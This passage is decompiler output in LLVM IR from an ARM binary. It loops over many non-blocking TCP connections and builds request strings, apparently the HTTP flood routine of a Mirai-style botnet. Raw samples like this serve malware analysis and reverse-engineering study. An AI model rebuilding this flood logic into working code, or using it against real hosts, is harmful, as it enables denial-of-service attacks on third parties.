dec_label_pc_85cc:                                ; preds = %dec_label_pc_85c4
  %v2_85cc = icmp ugt i8 %v3_860c, 9
  store i1 %v2_85cc, i1* %cpsr_c.global-to-local, align 1
  %v7_85cc = icmp eq i8 %v3_860c, 10
  store i1 %v7_85cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85cc, label %dec_label_pc_8fac, label %dec_label_pc_85d4

dec_label_pc_85d4:                                ; preds = %dec_label_pc_85cc
  %v1_85d4 = add nsw i32 %v4_860c, -11
  %v2_85d4 = icmp ugt i8 %v3_860c, 10
  store i1 %v2_85d4, i1* %cpsr_c.global-to-local, align 1
  %v7_85d4 = icmp eq i8 %v3_860c, 11
  store i1 %v7_85d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_85d4, label %dec_label_pc_956c, label %dec_label_pc_85dc

dec_label_pc_85dc:                                ; preds = %dec_label_pc_8cec, %dec_label_pc_85d4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_860c, align 1
  %v0_85e4 = load i32, i32* @r6, align 4
  %v1_85e4 = add i32 %v0_85e4, -1452
  %v2_85e4 = inttoptr i32 %v1_85e4 to i32*
  %v3_85e4 = load i32, i32* %v2_85e4, align 4
  store i32 %v3_85e4, i32* %r0.global-to-local, align 4
  %v1_85e8 = call i32 @__GI___libc_close(i32 %v3_85e4)
  store i32 %v1_85e8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_85f0 = load i32, i32* @r6, align 4
  %v2_85f0 = add i32 %v1_85f0, -1452
  %v3_85f0 = inttoptr i32 %v2_85f0 to i32*
  store i32 -1, i32* %v3_85f0, align 4
  br label %dec_label_pc_85f4

dec_label_pc_85f4:                                ; preds = %dec_label_pc_8fac, %dec_label_pc_8f58, %dec_label_pc_8d1c, %dec_label_pc_8628, %dec_label_pc_8718, %dec_label_pc_956c, %bb180, %dec_label_pc_85dc
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_85f8 = load i32, i32* @r7, align 4
  %v1_85f8 = add i32 %v0_85f8, 1
  store i32 %v1_85f8, i32* @r7, align 4
  %v0_85fc = load i32, i32* @r6, align 4
  %v3_8600 = icmp uge i32 %v1_85f8, %v0_839c
  store i1 %v3_8600, i1* %cpsr_c.global-to-local, align 1
  %v9_8600 = icmp eq i32 %v1_85f8, %v0_839c
  store i1 %v9_8600, i1* %cpsr_z.global-to-local, align 1
  %v1_8604 = add i32 %v0_85fc, 3140
  store i32 %v1_8604, i32* @r6, align 4
  br i1 %v9_8600, label %dec_label_pc_85f4.dec_label_pc_8750_crit_edge, label %dec_label_pc_860c

dec_label_pc_85f4.dec_label_pc_8750_crit_edge:    ; preds = %dec_label_pc_85f4
  %v0_8750.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_8750

dec_label_pc_860c:                                ; preds = %dec_label_pc_8738, %dec_label_pc_85f4, %dec_label_pc_8598
  %v3_88b0 = phi i32 [ %stack_var_-20872.0.ph, %dec_label_pc_8598 ], [ %v1_8604, %dec_label_pc_85f4 ], [ %v1_8748, %dec_label_pc_8738 ]
  %v1_860c = add i32 %v3_88b0, -1448
  %v2_860c = inttoptr i32 %v1_860c to i8*
  %v3_860c = load i8, i8* %v2_860c, align 1
  %v4_860c = zext i8 %v3_860c to i32
  store i32 %v4_860c, i32* @r3, align 4
  %v2_8614 = icmp ne i8 %v3_860c, 0
  store i1 %v2_8614, i1* %cpsr_c.global-to-local, align 1
  %v6_8614 = icmp eq i8 %v3_860c, 0
  %v7_8614 = icmp eq i8 %v3_860c, 1
  store i1 %v7_8614, i1* %cpsr_z.global-to-local, align 1
  %v1_8618 = add i32 %v3_88b0, -1452
  store i32 %v1_8618, i32* @r5, align 4
  br i1 %v7_8614, label %dec_label_pc_88a4, label %dec_label_pc_8620

dec_label_pc_8620:                                ; preds = %dec_label_pc_860c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_8614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_8614, label %dec_label_pc_8628, label %dec_label_pc_85ac

dec_label_pc_8628:                                ; preds = %.thread19.dec_label_pc_8628_crit_edge, %dec_label_pc_8620
  %v0_8628 = phi i32 [ %v0_8628.pre, %.thread19.dec_label_pc_8628_crit_edge ], [ %v3_88b0, %dec_label_pc_8620 ]
  %v1_8628 = add i32 %v0_8628, -1452
  %v2_8628 = inttoptr i32 %v1_8628 to i32*
  %v3_8628 = load i32, i32* %v2_8628, align 4
  store i32 %v3_8628, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  %v2_8634 = icmp eq i32 %v3_8628, -1
  store i1 %v2_8634, i1* %cpsr_c.global-to-local, align 1
  %v7_8634 = icmp eq i32 %v3_8628, -1
  store i1 %v7_8634, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-76, align 4
  store i32 34380, i32* @lr, align 4
  %v1_8648 = xor i1 %v7_8634, true
  call void @__pseudo_cond_branch(i1 %v1_8648, i32 ptrtoint (i32* @global_var_16310.35 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  %v0_8654 = load i32, i32* @r5, align 4
  store i32 %v0_8654, i32* %r2.global-to-local, align 4
  %v3_8658 = call i32 @socket(i32 2, i32 1, i32 %v0_8654)
  store i32 %v3_8658, i32* %r0.global-to-local, align 4
  %v2_865c = icmp eq i32 %v3_8658, -1
  store i1 %v2_865c, i1* %cpsr_c.global-to-local, align 1
  %v7_865c = icmp eq i32 %v3_8658, -1
  store i1 %v7_865c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8658, i32* @r4, align 4
  %v1_8664 = load i32, i32* @r6, align 4
  %v2_8664 = add i32 %v1_8664, -1452
  %v3_8664 = inttoptr i32 %v2_8664 to i32*
  store i32 %v3_8658, i32* %v3_8664, align 4
  br i1 %v7_865c, label %dec_label_pc_85f4, label %dec_label_pc_866c

dec_label_pc_866c:                                ; preds = %dec_label_pc_8628
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_8670 = load i32, i32* @r5, align 4
  store i32 %v0_8670, i32* @r2, align 4
  %v2_8674 = call i32 @__libc_fcntl(i32 %v3_8658, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_867c = or i32 %v2_8674, 2048
  store i32 %v1_867c, i32* @r2, align 4
  %v0_8680 = load i32, i32* @r4, align 4
  store i32 %v0_8680, i32* %r0.global-to-local, align 4
  %v2_8684 = call i32 @__libc_fcntl(i32 %v0_8680, i32 4)
  store i32 %v2_8684, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %ip.global-to-local, align 4
  store i32 %v2_8694, i32* %r3.global-to-local, align 4
  %v0_8698 = load i32, i32* @r6, align 4
  %v1_8698 = add i32 %v0_8698, -1452
  %v2_8698 = inttoptr i32 %v1_8698 to i32*
  %v3_8698 = load i32, i32* %v2_8698, align 4
  store i32 %v3_8698, i32* %r0.global-to-local, align 4
  %v0_869c = load i32, i32* @r5, align 4
  store i32 %v0_869c, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %stack_var_-44, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 %v2_86ac, i32* %r3.global-to-local, align 4
  %v5_86b4 = call i32 @__GI_setsockopt(i32 %v3_8698, i32 %v0_869c, i32 8, i32 %v2_86ac, i32 4)
  store i32 %v5_86b4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-20864.0.ph, i32* %r1.global-to-local, align 4
  store i32 %v1_9e84, i32* %r2.global-to-local, align 4
  %v0_86c0 = load i32, i32* @r6, align 4
  %v1_86c0 = add i32 %v0_86c0, -1436
  %v2_86c0 = inttoptr i32 %v1_86c0 to i32*
  %v3_86c0 = load i32, i32* %v2_86c0, align 4
  store i32 %v3_86c0, i32* @r4, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_86cc, i32* %r3.global-to-local, align 4
  %v1_86d0 = add i32 %v0_86c0, -1452
  %v2_86d0 = inttoptr i32 %v1_86d0 to i32*
  %v3_86d0 = load i32, i32* %v2_86d0, align 4
  store i32 %v3_86d0, i32* %r0.global-to-local, align 4
  %v3_86e0 = add i32 %v0_86c0, -1448
  %v4_86e0 = inttoptr i32 %v3_86e0 to i8*
  store i8 2, i8* %v4_86e0, align 1
  store i32 %v2_8530, i32* %r3.global-to-local, align 4
  %v0_86ec = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_86ec, i32* %stack_var_-76, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 %v2_86f4, i32* %r1.global-to-local, align 4
  %v1_86f8 = load i32, i32* @r6, align 4
  %v2_86f8 = add i32 %v1_86f8, -1444
  %v3_86f8 = inttoptr i32 %v2_86f8 to i32*
  store i32 %v2_8530, i32* %v3_86f8, align 4
  %v3_86fc = call i32 @__libc_connect(i32 %v3_86d0, i32 %v2_86f4, i32 16)
  store i32 %v3_86fc, i32* %r0.global-to-local, align 4
  %v0_8700 = load i32, i32* @r6, align 4
  %v1_8700 = add i32 %v0_8700, -1452
  %v2_8700 = inttoptr i32 %v1_8700 to i32*
  %v3_8700 = load i32, i32* %v2_8700, align 4
  store i32 %v3_8700, i32* %ip.global-to-local, align 4
  %v3_8708 = udiv i32 %v3_8700, 32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_870c = mul nuw nsw i32 %v3_8708, 4
  store i32 %v3_870c, i32* %r2.global-to-local, align 4
  store i32 %v2_8710, i32* @lr, align 4
  br label %dec_label_pc_8718

dec_label_pc_8718:                                ; preds = %dec_label_pc_8d00, %dec_label_pc_866c
  %v0_8728 = phi i32 [ %v3_8700, %dec_label_pc_866c ], [ %v3_8d00, %dec_label_pc_8d00 ]
  %v3_870c.pn = phi i32 [ %v3_870c, %dec_label_pc_866c ], [ %v3_8d0c, %dec_label_pc_8d00 ]
  %storemerge = add i32 %v3_870c.pn, %v2_8710
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_8718 = add i32 %storemerge, -292
  %v2_8718 = inttoptr i32 %v1_8718 to i32*
  %v3_8718 = load i32, i32* %v2_8718, align 4
  %v1_871c = urem i32 %v0_8728, 32
  store i32 %v1_871c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v7_8724 = shl i32 1, %v1_871c
  %v8_8724 = or i32 %v3_8718, %v7_8724
  store i32 %v8_8724, i32* @r1, align 4
  %v1_8728 = load i32, i32* @r8, align 4
  %v2_8728 = sub i32 %v0_8728, %v1_8728
  %v3_8728 = icmp uge i32 %v0_8728, %v1_8728
  store i1 %v3_8728, i1* %cpsr_c.global-to-local, align 1
  %v4_8728 = xor i32 %v1_8728, %v0_8728
  %v5_8728 = xor i32 %v2_8728, %v0_8728
  %v6_8728 = and i32 %v5_8728, %v4_8728
  %v7_8728 = icmp slt i32 %v6_8728, 0
  %v8_8728 = icmp slt i32 %v2_8728, 0
  %v9_8728 = icmp eq i32 %v0_8728, %v1_8728
  store i1 %v9_8728, i1* %cpsr_z.global-to-local, align 1
  store i32 %v8_8724, i32* %v2_8718, align 4
  %v3_8730 = xor i1 %v8_8728, %v7_8728
  %v4_8730 = or i1 %v9_8728, %v3_8730
  br i1 %v4_8730, label %dec_label_pc_85f4, label %dec_label_pc_8734

dec_label_pc_8734:                                ; preds = %dec_label_pc_8718
  %v0_8734 = load i32, i32* %ip.global-to-local, align 4
  %v1_8734 = load i32, i32* %r3.global-to-local, align 4
  %v2_8734 = add i32 %v1_8734, %v0_8734
  store i32 %v2_8734, i32* @r8, align 4
  br label %dec_label_pc_8738

dec_label_pc_8738:                                ; preds = %dec_label_pc_8fe0, %dec_label_pc_8f8c, %dec_label_pc_8d50, %dec_label_pc_8734
  %v0_875065 = phi i32 [ %v2_8fe0, %dec_label_pc_8fe0 ], [ %v2_8f8c, %dec_label_pc_8f8c ], [ %v2_8d50, %dec_label_pc_8d50 ], [ %v2_8734, %dec_label_pc_8734 ]
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_873c = load i32, i32* @r7, align 4
  %v1_873c = add i32 %v0_873c, 1
  store i32 %v1_873c, i32* @r7, align 4
  %v0_8740 = load i32, i32* @r6, align 4
  %v3_8744 = icmp uge i32 %v1_873c, %v0_839c
  store i1 %v3_8744, i1* %cpsr_c.global-to-local, align 1
  %v9_8744 = icmp eq i32 %v1_873c, %v0_839c
  store i1 %v9_8744, i1* %cpsr_z.global-to-local, align 1
  %v1_8748 = add i32 %v0_8740, 3140
  store i32 %v1_8748, i32* @r6, align 4
  br i1 %v9_8744, label %dec_label_pc_8750, label %dec_label_pc_860c

dec_label_pc_8750:                                ; preds = %dec_label_pc_8738, %dec_label_pc_85f4.dec_label_pc_8750_crit_edge
  %v0_8788 = phi i32 [ %v0_8750.pre, %dec_label_pc_85f4.dec_label_pc_8750_crit_edge ], [ %v0_875065, %dec_label_pc_8738 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8750 = icmp eq i32 %v0_8788, 0
  store i1 %v2_8750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8750, label %dec_label_pc_852c, label %dec_label_pc_8758

dec_label_pc_8758:                                ; preds = %dec_label_pc_8750
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-60, align 4
  store i32 %v2_8778, i32* %ip.global-to-local, align 4
  store i32 %v2_877c, i32* %r1.global-to-local, align 4
  store i32 %v2_8780, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_8788, i32* %r0.global-to-local, align 4
  %v5_8790 = call i32 @__libc_select(i32 %v0_8788, i32 %v2_877c, i32 %v2_8780, i32 0, i32 %v2_8778)
  store i32 %v5_8790, i32* @r4, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  store i32 %v0_8798, i32* %r0.global-to-local, align 4
  %v1_879c = inttoptr i32 %v0_8798 to i32*
  %v2_879c = call i32 @__GI_time(i32* %v1_879c)
  store i32 %v2_879c, i32* %r0.global-to-local, align 4
  %v0_87a0 = load i32, i32* @r4, align 4
  %v1_87a0 = load i32, i32* @r5, align 4
  %v3_87a0 = icmp uge i32 %v0_87a0, %v1_87a0
  store i1 %v3_87a0, i1* %cpsr_c.global-to-local, align 1
  %v9_87a0 = icmp eq i32 %v0_87a0, %v1_87a0
  store i1 %v9_87a0, i1* %cpsr_z.global-to-local, align 1
  %v7_87a8 = icmp sgt i32 %v0_87a0, %v1_87a0
  br i1 %v7_87a8, label %dec_label_pc_87ac, label %dec_label_pc_852c

dec_label_pc_87ac:                                ; preds = %dec_label_pc_8758
  %v0_880c.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_880c

dec_label_pc_87b4:                                ; preds = %dec_label_pc_8820, %dec_label_pc_888c
  %v1_87c4 = phi i32 [ %v1_8838, %dec_label_pc_8820 ], [ %v1_87c4.pre, %dec_label_pc_888c ]
  %v0_87bc = phi i32 [ %v3_8828, %dec_label_pc_8820 ], [ %v0_87bc.pre, %dec_label_pc_888c ]
  store i32 %v2_8710, i32* %r3.global-to-local, align 4
  %v2_87bc = add i32 %v0_87bc, %v2_8710
  store i32 %v2_87bc, i32* %r2.global-to-local, align 4
  %v1_87c0 = add i32 %v2_87bc, -164
  %v2_87c0 = inttoptr i32 %v1_87c0 to i32*
  %v3_87c0 = load i32, i32* %v2_87c0, align 4
  %v2_87c4 = add i32 %v1_87c4, -1
  %v3_87c4 = shl i32 1, %v2_87c4
  %v4_87c4 = and i32 %v3_87c0, %v3_87c4
  %v5_87c4 = icmp ne i32 %v4_87c4, 0
  store i1 %v5_87c4, i1* %cpsr_c.global-to-local, align 1
  %v6_87c4 = ashr i32 %v3_87c0, %v1_87c4
  store i32 %v6_87c4, i32* %r3.global-to-local, align 4
  %v1_87c8 = urem i32 %v6_87c4, 2
  %v2_87c8 = icmp eq i32 %v1_87c8, 0
  store i1 %v2_87c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_87c8, label %dec_label_pc_87ec, label %dec_label_pc_87d0

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87b4
  %v0_87d0 = load i32, i32* @sl, align 4
  %v1_87d0 = add i32 %v0_87d0, -1448
  %v2_87d0 = inttoptr i32 %v1_87d0 to i8*
  %v3_87d0 = load i8, i8* %v2_87d0, align 1
  %v4_87d0 = zext i8 %v3_87d0 to i32
  store i32 %v4_87d0, i32* %r3.global-to-local, align 4
  %v2_87d4 = icmp ugt i8 %v3_87d0, 5
  store i1 %v2_87d4, i1* %cpsr_c.global-to-local, align 1
  %v7_87d4 = icmp eq i8 %v3_87d0, 6
  store i1 %v7_87d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87d4, label %dec_label_pc_9028, label %dec_label_pc_87dc

dec_label_pc_87dc:                                ; preds = %dec_label_pc_87d0
  %v2_87dc = icmp ugt i8 %v3_87d0, 6
  store i1 %v2_87dc, i1* %cpsr_c.global-to-local, align 1
  %v7_87dc = icmp eq i8 %v3_87d0, 7
  store i1 %v7_87dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87dc, label %dec_label_pc_8d58, label %dec_label_pc_87e4

dec_label_pc_87e4:                                ; preds = %dec_label_pc_87dc
  %v2_87e4 = icmp ugt i8 %v3_87d0, 9
  store i1 %v2_87e4, i1* %cpsr_c.global-to-local, align 1
  %v7_87e4 = icmp eq i8 %v3_87d0, 10
  store i1 %v7_87e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87e4, label %dec_label_pc_9660, label %dec_label_pc_87ec

dec_label_pc_87ec:                                ; preds = %dec_label_pc_8e58, %dec_label_pc_96f0, %dec_label_pc_96a0, %dec_label_pc_9078, %dec_label_pc_87e4, %dec_label_pc_87b4, %dec_label_pc_880c, %dec_label_pc_9b40, %dec_label_pc_99ec, %dec_label_pc_9974, %dec_label_pc_9918, %dec_label_pc_96fc, %dec_label_pc_96cc, %dec_label_pc_96b0, %dec_label_pc_9654, %dec_label_pc_9550, %dec_label_pc_8f94
  store i32 %v0_839c, i32* %r3.global-to-local, align 4
  %v1_87f4 = add i32 %stack_var_-20820.0, 1
  store i32 %v1_87f4, i32* %r2.global-to-local, align 4
  %v0_87f8 = load i32, i32* @sl, align 4
  %v3_87fc = icmp uge i32 %v1_87f4, %v0_839c
  store i1 %v3_87fc, i1* %cpsr_c.global-to-local, align 1
  %v9_87fc = icmp eq i32 %v1_87f4, %v0_839c
  store i1 %v9_87fc, i1* %cpsr_z.global-to-local, align 1
  %v1_8804 = add i32 %v0_87f8, 3140
  store i32 %v1_8804, i32* @sl, align 4
  br i1 %v9_87fc, label %dec_label_pc_852c, label %dec_label_pc_880c

dec_label_pc_880c:                                ; preds = %dec_label_pc_87ec, %dec_label_pc_87ac
  %v0_880c = phi i32 [ %v0_880c.pre, %dec_label_pc_87ac ], [ %v1_8804, %dec_label_pc_87ec ]
  %stack_var_-20820.0 = phi i32 [ %v1_87a0, %dec_label_pc_87ac ], [ %v1_87f4, %dec_label_pc_87ec ]
  %v1_880c = add i32 %v0_880c, -1452
  %v2_880c = inttoptr i32 %v1_880c to i32*
  %v3_880c = load i32, i32* %v2_880c, align 4
  store i32 %v3_880c, i32* %r0.global-to-local, align 4
  %v2_8814 = icmp eq i32 %v3_880c, -1
  store i1 %v2_8814, i1* %cpsr_c.global-to-local, align 1
  %v7_8814 = icmp eq i32 %v3_880c, -1
  store i1 %v7_8814, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_880c, i32* %sb.global-to-local, align 4
  br i1 %v7_8814, label %dec_label_pc_87ec, label %dec_label_pc_8820

dec_label_pc_8820:                                ; preds = %dec_label_pc_880c
  %v3_8820 = udiv i32 %v3_880c, 32
  %v3_8828 = mul nuw nsw i32 %v3_8820, 4
  store i32 %v3_8828, i32* @ip, align 4
  store i32 %v2_8710, i32* @lr, align 4
  %v2_8830 = add i32 %v3_8828, %v2_8710
  store i32 %v2_8830, i32* %r2.global-to-local, align 4
  %v1_8834 = add i32 %v2_8830, -292
  %v2_8834 = inttoptr i32 %v1_8834 to i32*
  %v3_8834 = load i32, i32* %v2_8834, align 4
  %v1_8838 = urem i32 %v3_880c, 32
  store i32 %v1_8838, i32* %r1.global-to-local, align 4
  %v2_883c = add nsw i32 %v1_8838, -1
  %v3_883c = shl i32 1, %v2_883c
  %v4_883c = and i32 %v3_8834, %v3_883c
  %v5_883c = icmp ne i32 %v4_883c, 0
  store i1 %v5_883c, i1* %cpsr_c.global-to-local, align 1
  %v6_883c = ashr i32 %v3_8834, %v1_8838
  store i32 %v6_883c, i32* %r3.global-to-local, align 4
  %v1_8840 = urem i32 %v6_883c, 2
  %v2_8840 = icmp eq i32 %v1_8840, 0
  store i1 %v2_8840, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8840, label %dec_label_pc_87b4, label %dec_label_pc_8848

dec_label_pc_8848:                                ; preds = %dec_label_pc_8820
  store i32 %v10_82f0, i32* %ip.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_8860, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 4, i32* %stack_var_-52, align 4
  store i32 %v2_886c, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_8878 = call i32 @getsockopt(i32 %v3_880c, i32 1, i32 4, i32 %v2_8860, i32 %v2_886c)
  store i32 %v10_82f0, i32* @r1, align 4
  %v3_8880 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_8880, i32* %r3.global-to-local, align 4
  %v2_8884 = or i32 %v3_8880, %v5_8878
  store i32 %v2_8884, i32* %r0.global-to-local, align 4
  %v4_8884 = icmp eq i32 %v2_8884, 0
  store i1 %v4_8884, i1* %cpsr_z.global-to-local, align 1
  %v0_888c = load i32, i32* @sl, align 4
  %v1_888c = add i32 %v0_888c, -1452
  %v2_888c = inttoptr i32 %v1_888c to i32*
  %v3_888c = load i32, i32* %v2_888c, align 4
  br i1 %v4_8884, label %dec_label_pc_888c, label %dec_label_pc_8f94

dec_label_pc_888c:                                ; preds = %dec_label_pc_8848
  store i32 %v3_888c, i32* %r3.global-to-local, align 4
  %v3_8890 = udiv i32 %v3_888c, 32
  store i32 %v3_8890, i32* %r2.global-to-local, align 4
  %v1_8894 = urem i32 %v3_888c, 32
  store i32 %v1_8894, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8898 = mul nuw nsw i32 %v3_8890, 4
  store i32 %v3_8898, i32* @ip, align 4
  %v0_889c = load i32, i32* @r4, align 4
  %v1_889c = trunc i32 %v0_889c to i8
  %v3_889c = add i32 %v0_888c, -1448
  %v4_889c = inttoptr i32 %v3_889c to i8*
  store i8 %v1_889c, i8* %v4_889c, align 1
  %v0_87bc.pre = load i32, i32* @ip, align 4
  %v1_87c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_87b4

dec_label_pc_88a4:                                ; preds = %dec_label_pc_860c
  %v1_88a4 = add i32 %v3_88b0, 4
  %v2_88a4 = inttoptr i32 %v1_88a4 to i32*
  %v3_88a4 = load i32, i32* %v2_88a4, align 4
  store i32 %v3_88a4, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_88a8 = icmp eq i32 %v3_88a4, 0
  store i1 %v2_88a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_88a8, label %.thread19, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_88a4
  store i32 4, i32* @r3, align 4
  store i8 4, i8* %v2_860c, align 1
  %v0_88b4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_88b4.pr.pr, label %.thread17..thread19_crit_edge, label %dec_label_pc_88bc

.thread17..thread19_crit_edge:                    ; preds = %.thread17
  %v1_88b4.pre = load i32, i32* @r3, align 4
  %v3_88b4.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_88b4.pre to i8
  br label %.thread19

.thread19:                                        ; preds = %.thread17..thread19_crit_edge, %dec_label_pc_88a4
  %v3_88b4 = phi i32 [ %v3_88b4.pre, %.thread17..thread19_crit_edge ], [ %v3_88b0, %dec_label_pc_88a4 ]
  %v1_88b4.off0 = phi i8 [ %extract.t, %.thread17..thread19_crit_edge ], [ 0, %dec_label_pc_88a4 ]
  %v4_88b4 = add i32 %v3_88b4, -1448
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 %v1_88b4.off0, i8* %v5_88b4, align 1
  %v0_88b8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_88b8.pr, label %.thread19.dec_label_pc_8628_crit_edge, label %dec_label_pc_88bc

.thread19.dec_label_pc_8628_crit_edge:            ; preds = %.thread19
  %v0_8628.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_8628

dec_label_pc_88bc:                                ; preds = %.thread17, %dec_label_pc_85b4, %.thread19
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  %v0_88c4 = load i32, i32* @r5, align 4
  %v1_88c4 = add i32 %v0_88c4, 2112
  store i32 %v1_88c4, i32* %r0.global-to-local, align 4
  %v1_88c8 = load i32, i32* @r6, align 4
  %v2_88c8 = add i32 %v1_88c8, 12
  %v3_88c8 = inttoptr i32 %v2_88c8 to i32*
  store i32 -1, i32* %v3_88c8, align 4
  %v0_88cc = load i32, i32* %r0.global-to-local, align 4
  %v1_88cc = add i32 %v0_88cc, 4
  store i32 %v1_88cc, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_88d4 = load i32, i32* %sb.global-to-local, align 4
  %v1_88d4 = load i32, i32* @r6, align 4
  %v2_88d4 = inttoptr i32 %v1_88d4 to i32*
  store i32 %v0_88d4, i32* %v2_88d4, align 4
  %v2_88d8 = call i32 @util_zero(i32 %v1_88cc, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_88e4 = load i32, i32* %sb.global-to-local, align 4
  %v1_88e4 = load i32, i32* @r6, align 4
  %v2_88e4 = add i32 %v1_88e4, 660
  %v3_88e4 = inttoptr i32 %v2_88e4 to i32*
  store i32 %v0_88e4, i32* %v3_88e4, align 4
  %v2_88e8 = call i32 @util_zero(i32 %stack_var_-20860.0.ph, i32 10240)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88f0 = call i32 @util_strlen(i8* %v1_88f0)
  %v0_88f4 = load i32, i32* @r5, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_88fc = add i32 %v0_88f4, 1431
  store i32 %v1_88fc, i32* %fp.global-to-local, align 4
  %v2_8900 = add i32 %v2_88f0, %stack_var_-20860.0.ph
  store i32 %v2_8900, i32* @r0, align 4
  store i32 %v1_88fc, i32* %r1.global-to-local, align 4
  %v2_8908 = inttoptr i32 %v2_8900 to i8*
  %v3_8908 = call i32 @util_strcpy(i8* %v2_8908, i32 %v1_88fc)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8910 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_1b360.37 to i32), i32* %r1.global-to-local, align 4
  %v2_891c = add i32 %v2_8910, %stack_var_-20860.0.ph
  store i32 %v2_891c, i32* @r0, align 4
  %v2_8920 = inttoptr i32 %v2_891c to i8*
  %v3_8920 = call i32 @util_strcpy(i8* %v2_8920, i32 ptrtoint (i32* @global_var_1b360.37 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8928 = call i32 @util_strlen(i8* %v1_88f0)
  %v2_8930 = add i32 %v2_8928, %stack_var_-20860.0.ph
  store i32 %v2_8930, i32* @r0, align 4
  %v0_8934 = load i32, i32* @r5, align 4
  %v1_8934 = add i32 %v0_8934, 532
  store i32 %v1_8934, i32* %r1.global-to-local, align 4
  %v2_8938 = inttoptr i32 %v2_8930 to i8*
  %v3_8938 = call i32 @util_strcpy(i8* %v2_8938, i32 %v1_8934)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8940 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1b338.39 to i32), i32* %r1.global-to-local, align 4
  %v2_894c = add i32 %v2_8940, %stack_var_-20860.0.ph
  store i32 %v2_894c, i32* @r0, align 4
  %v3_8950 = inttoptr i32 %v2_894c to i8*
  %v4_8950 = call i32 @util_strcpy(i8* %v3_8950, i32 ptrtoint ([24 x i8]* @global_var_1b338.39 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8958 = call i32 @util_strlen(i8* %v1_88f0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v1_8960 = add i32 %v0_8960, 20
  store i32 %v1_8960, i32* %r1.global-to-local, align 4
  %v2_8964 = add i32 %v2_8958, %stack_var_-20860.0.ph
  store i32 %v2_8964, i32* @r0, align 4
  %v2_8968 = inttoptr i32 %v2_8964 to i8*
  %v3_8968 = call i32 @util_strcpy(i8* %v2_8968, i32 %v1_8960)
